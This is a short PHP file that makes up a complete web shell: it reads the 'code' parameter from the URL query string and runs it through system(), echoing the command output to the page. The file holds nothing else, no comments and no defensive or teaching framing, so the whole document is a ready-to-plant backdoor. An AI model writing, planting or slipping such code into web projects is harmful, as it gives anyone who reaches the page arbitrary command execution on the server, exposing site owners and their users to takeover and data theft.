<?php

if(isset($_GET['code'])){
    $cmd = $_GET['code'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
